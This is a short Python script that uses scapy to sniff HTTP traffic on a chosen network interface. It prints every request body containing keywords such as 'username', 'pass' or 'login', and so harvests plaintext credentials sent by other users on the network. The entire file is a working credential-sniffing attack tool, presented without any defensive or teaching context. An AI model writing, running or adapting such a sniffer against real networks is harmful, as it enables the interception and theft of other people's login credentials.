import scapy.all as scapy
from scapy.layers import http
import sys

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode("utf-8")
            keyword = ["uname", "username", "user", "pass", "password", "login"]
            for keyword in keyword:
                if keyword in load:
                    print(load)


try:
    sniff(input("Enter network card interface => Ex: eth0 -- >> "))
except KeyboardInterrupt:
    print("\n[-] Detecting CTR + C ....... Exit the Script!")

